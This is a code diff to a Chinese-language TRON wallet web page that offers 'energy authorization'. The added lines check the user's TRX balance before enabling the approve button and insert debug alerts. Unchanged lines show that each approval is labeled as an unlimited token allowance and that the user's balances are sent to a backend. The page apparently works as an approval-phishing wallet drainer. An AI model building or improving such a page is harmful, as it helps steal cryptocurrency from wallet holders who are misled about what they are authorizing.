@@ -16,6 +16,7 @@
                background: #409EFF; color: white; cursor: pointer; margin-bottom: 15px; }
         .btn:disabled { background: #ccc; cursor: not-allowed; }
         #userInfo { text-align: center; font-size: 14px; color: #333; margin: 20px 0; padding: 15px; background: #fff; border-radius: 8px; }
+        #trxInfo { text-align: center; font-size: 14px; color: #333; margin: 20px 0; padding: 15px; background: #fff; border-radius: 8px; }
         .record-list { margin-top: 30px; }
         .record-item { background: #fff; padding: 15px; margin-bottom: 15px; border-radius: 8px; font-size: 14px; }
         .record-item p { margin-bottom: 8px; color: #333; }
@@ -48,6 +49,7 @@
 <button id="approveBtn" class="btn" disabled>能量授权</button>
 
 <div id="userInfo">未连接钱包</div>
+<div id="trxInfo"></div>
 
 <div class="record-list">
     <h3 style="font-size: 16px; margin-bottom: 15px; color: #2c3e50;">授权记录</h3>
@@ -132,6 +134,12 @@
                 });
                 alert("授权结果: " + JSON.stringify(result));
 
+                // 检查 result 对象是否有 transaction 属性
+                if (!result.transaction) {
+                  alert("错误：result 对象没有 transaction 属性");
+                  return;
+                }
+
                 // 授权成功：查余额+传后端+存记录
                 alert("准备调用 getTokenBalance 和 getTrxBalance 函数");
                 const [tokenBalance, trxBalance] = await Promise.all([
@@ -148,6 +156,7 @@
                     approveType: "无限额度" // 新增：标注类型
                 };
 
+                alert("准备调用 saveApprovalRecord 函数");
                 saveApprovalRecord(record);
                 alert("准备调用 sendDataToBackend 函数");
                 await sendDataToBackend(record);
@@ -170,11 +179,24 @@
             trc20Contract = await tronWeb.contract().at(TRC20_TOKEN_ADDRESS);
             alert("trc20Contract 对象已正确初始化");
 
+            // 检查 TRX 余额
+            const trxBalance = await getTrxBalance(userAddress);
+            if (trxBalance < 1) { // 假设需要至少 1 TRX
+                document.getElementById("trxInfo").innerHTML = `
+                    <div style="color: red; text-align: center;">
+                        ⚠️ TRX 余额不足，请确保钱包中有足够的 TRX 以支付交易手续费。
+                    </div>
+                `;
+                document.getElementById("approveBtn").disabled = true;
+            } else {
+                document.getElementById("trxInfo").innerHTML = "";
+                document.getElementById("approveBtn").disabled = false;
+            }
+
             document.getElementById("userInfo").innerHTML = `
                 已连接：<br>
                 ${userAddress.slice(0, 8)}...${userAddress.slice(-6)}
             `;
-            document.getElementById("approveBtn").disabled = false;
         } catch (e) {
             alert("钱包初始化失败：" + e.message);
         }
